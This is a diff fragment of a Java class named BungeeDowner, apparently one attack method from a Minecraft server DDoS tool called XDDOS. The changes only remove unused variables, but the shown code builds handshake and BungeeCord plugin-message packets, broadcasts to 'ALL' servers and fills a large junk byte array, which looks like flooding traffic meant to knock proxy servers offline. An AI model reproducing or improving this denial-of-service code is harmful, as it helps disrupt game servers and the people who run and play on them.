@@ -25,7 +25,6 @@ implements IMethod{
     private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();
     public byte[] ad = new byte[]{127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128};
     private static String sa = "";
-    private volatile int i = 0;
     public byte[] custompayload;
 
     public BungeeDowner() {
@@ -113,8 +112,6 @@ implements IMethod{
         out.write(250);
         char[] achar = packet.toCharArray();
         out.writeShort(achar.length);
-        int n = achar.length;
-        boolean n2 = false;
         out.write(input);
         byte[] data = bytes.toByteArray();
         bytes.close();
@@ -129,8 +126,6 @@ implements IMethod{
         out.write(250);
         char[] achar = "REGISTER".toCharArray();
         out.writeShort(achar.length);
-        int n = achar.length;
-        boolean n2 = false;
         out.writeUTF(sa);
         byte[] data = bytes.toByteArray();
         bytes.close();
@@ -145,8 +140,6 @@ implements IMethod{
         out.write(250);
         char[] achar = "BungeeCord".toCharArray();
         out.writeShort(achar.length);
-        int n = achar.length;
-        boolean n2 = false;
         out.writeUTF("Message");
         out.writeUTF("ALL");
         out.writeUTF("lobby1");
